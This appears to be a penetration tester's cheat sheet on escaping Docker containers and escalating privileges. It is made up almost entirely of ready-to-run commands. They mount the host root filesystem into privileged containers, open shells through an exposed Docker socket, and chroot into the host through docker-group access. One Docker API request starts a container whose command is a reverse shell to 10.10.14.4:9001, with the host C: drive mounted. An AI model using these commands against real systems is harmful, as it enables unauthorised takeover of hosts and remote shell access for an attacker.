## Docker Sockets
> Assume the socket is at `/app/docker.sock`
### Download standalone docker binary
if only socket and no client, we download the docker binary
```sh
wget https://master.dockerproject.com/linux/x86_64/docker
chmod +x docker
```
### List running containers
```sh
docker -H unix:///app/docker.sock ps
```
create a container, mount `/` on host to `/hostsystem` in docker container
```sh
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```
Get a shell on the newly created container
```sh
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
```
## Docker API
Unix doesn't really has an API interface. Unix uses a socket. This is CVE-2025-9074, specific to windows where any docker container can access the docker management API interface.
```sh
## Find out what image we already have.
curl -s http://192.168.65.7:2375/images/json
## Run the image `docker_setup-nginx-php:latest` with a revshell at the start and mount C:/ to /mnt in the container
curl -H 'Content-Type: application/json' -d '{ "Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/sh","-c","sh -i >& /dev/tcp/10.10.14.4/9001 0>&1"], "HostConfig": { "Binds": ["/mnt/host/c:/mnt"] } }' 'http://192.168.65.7:2375/containers/create'
## Start the container
curl -X POST http://192.168.65.7:2375/containers/162029b3c9126ebcce791e9ade834846088d0107ff8e7c93caba04393c224515/start
```
## Docker group
```sh
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```
